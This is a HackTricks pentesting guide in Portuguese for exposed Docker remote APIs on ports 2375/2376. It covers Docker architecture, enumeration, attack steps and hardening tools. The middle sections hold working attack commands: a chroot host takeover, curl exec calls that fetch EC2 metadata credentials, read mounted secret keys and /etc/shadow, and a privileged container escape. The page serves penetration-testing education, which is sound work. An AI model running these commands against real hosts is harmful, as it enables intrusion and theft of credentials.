## 2375, 2376 Pentesting Docker

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Conceitos básicos do Docker

### O que é

A plataforma Docker é a plataforma de contêiner líder do setor para inovação contínua e de alta velocidade, permitindo que organizações construam e compartilhem qualquer aplicativo - desde legados até o que vem a seguir - e executem com segurança em qualquer lugar.

### Arquitetura básica do Docker

Essas informações são provenientes [daqui](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc).

* [containerd](http://containerd.io) é um tempo de execução de contêiner que pode **gerenciar todo o ciclo de vida do contêiner - desde a transferência/armazenamento de imagens até a execução, supervisão e rede do contêiner**. **Mais informações sobre o containerd abaixo.**
* container-shim lida com contêineres sem cabeça, o que significa que, uma vez que o runc inicializa os contêineres, ele sai entregando os contêineres ao container-shim, que age como um intermediário.
* [runc](http://runc.io) é um tempo de execução de contêiner universal e leve, que segue a especificação OCI. **O runc é usado pelo containerd para criar e executar contêineres de acordo com a especificação OCI**. Também é o empacotamento do libcontainer.
* [grpc](http://www.grpc.io) usado para comunicação entre o containerd e o docker-engine.
* [OCI](https://www.opencontainers.org) mantém a especificação OCI para tempo de execução e imagens. As versões atuais do Docker suportam as especificações de imagem e tempo de execução OCI.

![runC, containerD](https://i.stack.imgur.com/5aXF6.png)

### Comandos básicos
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

O Containerd foi projetado para ser usado pelo Docker e Kubernetes, bem como por qualquer outra plataforma de contêiner que queira **abstrair syscalls ou funcionalidades específicas do SO para executar contêineres** no Linux, Windows, Solaris ou outros SOs. Com esses usuários em mente, queríamos ter certeza de que o containerd tem apenas o que eles precisam e nada que não precisem. Realisticamente, isso é impossível, mas pelo menos é o que tentamos fazer. Coisas como **rede estão fora do escopo do containerd**. A razão para isso é que, ao construir um sistema distribuído, a rede é um aspecto muito central. Com SDN e descoberta de serviço hoje, a rede é muito mais específica da plataforma do que abstrair chamadas netlink no Linux.

Observe que **o Docker usa o Containerd, mas ele fornece apenas um subconjunto dos recursos que o Docker fornece**. Portanto, por exemplo, o ContainerD não possui recursos de gerenciamento de rede do Docker, nem você pode usar o ContainerD sozinho para criar enxames do Docker.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine 
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

**Informação** [**daqui**](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)

Podman é um motor de contêineres de código aberto compatível com OCI ([Open Container Initiative](https://github.com/opencontainers)). É impulsionado pela Red Hat e incorpora algumas diferenças importantes do Docker, como sua arquitetura sem daemon e suporte para contêineres sem raiz. Em sua essência, **ambas as ferramentas fazem a mesma coisa: gerenciam imagens e contêineres**. Um dos **objetivos do Podman é ter uma API compatível com o Docker**. Portanto, quase todos os comandos da CLI (interface de linha de comando) do Docker também estão disponíveis no Podman.

Você pode encontrar outras duas ferramentas no ecossistema Podman: Buildah e Skopeo. Buildah é uma ferramenta CLI usada para construir imagens de contêineres, e Skopeo é uma ferramenta CLI para executar operações em imagens, como push, pull ou inspect. [Por favor, verifique o GitHub](https://github.com/containers/buildah/tree/master/docs/containertools) para obter mais informações sobre essas ferramentas e sua relação com o Podman.

**As principais diferenças**

**A maior diferença entre o Docker e o Podman é sua arquitetura**. **O Docker** roda em uma arquitetura **cliente-servidor**, enquanto o **Podman** roda em uma arquitetura **sem daemon**. Mas o que isso significa? Ao trabalhar com o **Docker**, você precisa usar a CLI do Docker, que se comunica com um **daemon em segundo plano** (o daemon do Docker). A lógica principal reside no daemon, que constrói imagens e executa contêineres. Esse **daemon é executado com privilégios de root**. A arquitetura do **Podman**, por outro lado, permite que você **execute os contêineres sob o usuário que está iniciando o contêiner** (fork/exec), e esse usuário não precisa de nenhum privilégio de root. Como **o Podman tem uma arquitetura sem daemon, cada usuário que executa o Podman só pode ver e modificar seus próprios contêineres**. Não há um daemon comum com o qual a ferramenta CLI se comunique.

Como o Podman não tem um daemon, ele precisa de uma maneira de suportar a execução de contêineres em segundo plano. Portanto, ele fornece uma integração com o **systemd**, que permite controlar os contêineres por meio de unidades do systemd. Dependendo da versão do Podman, você pode gerar essas unidades para contêineres existentes ou gerar unidades que possam criar contêineres se eles não existirem no sistema. Há outro modelo de integração com o systemd, que permite que o systemd seja executado dentro de um contêiner. Por padrão, o Docker usa o systemd para controlar o processo do daemon.

A segunda grande diferença diz respeito à forma como os contêineres são executados. Com o **Podman**, **os contêineres são executados sob os privilégios do usuário e não sob o daemon**. Neste ponto, o conceito de contêineres sem raiz entra em jogo, o que significa que o contêiner pode ser iniciado sem privilégios de root. Os contêineres sem raiz têm uma grande vantagem sobre os contêineres com raiz, uma vez que (você adivinhou) eles não são executados sob a conta root. O benefício disso é que, se um invasor conseguir capturar e escapar de um contêiner, esse invasor ainda será um usuário normal no host. Os contêineres iniciados por um usuário não podem ter mais privilégios ou capacidades do que o próprio usuário. Isso adiciona uma camada natural de proteção.

{% hint style="info" %}
Observe que, como o Podman visa suportar a mesma API que o Docker, você pode usar os mesmos comandos com o Podman como com o Docker, como:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## Informações básicas

A API remota é executada por padrão na porta 2375 quando habilitada. O serviço por padrão não exigirá autenticação, permitindo que um invasor inicie um contêiner docker privilegiado. Ao usar a API remota, é possível anexar hosts / (diretório raiz) ao contêiner e ler/escrever arquivos do ambiente do host. 

**Porta padrão:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## Enumeração

### Manual

Observe que, para enumerar a API do Docker, você pode usar o comando `docker` ou `curl`, como no exemplo a seguir:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
 Version:           19.03.1
 API version:       1.40
 Go version:        go1.12.5
 Git commit:        74b1e89
 Built:             Thu Jul 25 21:21:05 2019
 OS/Arch:           linux/amd64
 Experimental:      false

Server: Docker Engine - Community
 Engine:
  Version:          19.03.1
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.12.5
  Git commit:       74b1e89
  Built:            Thu Jul 25 21:19:41 2019
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.2.6
  GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
 runc:
  Version:          1.0.0-rc8
  GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
```
Se você pode **acessar a API remota do Docker com o comando `docker`**, você pode **executar** qualquer um dos [**comandos do Docker** mencionados anteriormente](2375-pentesting-docker.md#basic-commands) para interagir com o serviço.

{% hint style="info" %}
Você pode `export DOCKER_HOST="tcp://localhost:2375"` e **evitar** o uso do parâmetro `-H` com o comando docker.
{% endhint %}

#### Escalada rápida de privilégios
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
Às vezes você verá a porta **2376** aberta para o endpoint **TLS**. Eu não consegui me conectar a ela com o cliente docker, mas você pode fazê-lo facilmente com o curl para acessar a API do docker.
```bash
#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Se você quiser mais informações sobre isso, mais informações estão disponíveis de onde eu copiei os comandos: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## Comprometendo

Na página a seguir, você pode encontrar maneiras de **escapar de um contêiner Docker**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Abusando disso, é possível escapar de um contêiner. Você pode executar um contêiner fraco na máquina remota, escapar dele e comprometer a máquina:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## Escalada de privilégios

Se você estiver dentro de um host que está usando o Docker, você pode [**ler esta informação para tentar elevar privilégios**](../linux-hardening/privilege-escalation/#writable-docker-socket).

## Descobrindo segredos em contêineres Docker em execução
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Verifique a seção **env** (variáveis de ambiente) em busca de segredos e você pode encontrar:

* Senhas.
* IPs.
* Portas.
* Caminhos.
* Outros...

Se você quiser extrair um arquivo:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## Segurança do seu Docker

### Instalação e uso seguro do Docker

* Você pode usar a ferramenta [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) para inspecionar sua instalação atual do Docker.
  * `./docker-bench-security.sh`
* Você pode usar a ferramenta [https://github.com/kost/dockscan](https://github.com/kost/dockscan) para inspecionar sua instalação atual do Docker.
  * `dockscan -v unix:///var/run/docker.sock`
* Você pode usar a ferramenta [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) para verificar os privilégios que um contêiner terá quando executado com diferentes opções de segurança. Isso é útil para saber as implicações do uso de algumas opções de segurança para executar um contêiner:
  * `docker run --rm -it r.j3ss.co/amicontained`
  * `docker run --rm -it --pid host r.j3ss.co/amicontained`
  * `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### Segurança de imagens do Docker

* Você pode usar uma imagem do Docker de [https://github.com/quay/clair](https://github.com/quay/clair) para fazer a varredura de suas outras imagens do Docker e encontrar vulnerabilidades.
  * `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
  * `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### Segurança de Dockerfiles

* Você pode usar a ferramenta [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configurações incorretas. Cada configuração incorreta receberá um ID, você pode encontrar aqui [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) como corrigir cada uma delas.
  * `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* Você pode usar a ferramenta [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configurações incorretas.
  * `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* Você pode usar a ferramenta [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configurações incorretas.
  * `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* Você pode usar a ferramenta [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configurações incorretas.
  * `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### Registro de atividades suspeitas

* Você pode usar a ferramenta [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) para detectar **comportamentos suspeitos em contêineres em execução**.
  * Observe no seguinte trecho como o **Falco compila um módulo do kernel e o insere**. Depois disso, ele carrega as regras e **começa a registrar atividades suspeitas**. Neste caso, ele detectou 2 contêineres privilegiados iniciados, 1 deles com um ponto de montagem sensível, e após alguns segundos ele detectou como um shell foi aberto dentro de um dos contêineres.
```
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
 - Original module
   - No original module exists within this kernel
 - Installation
   - Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### Monitorando Docker

Você pode usar o auditd para monitorar o Docker.
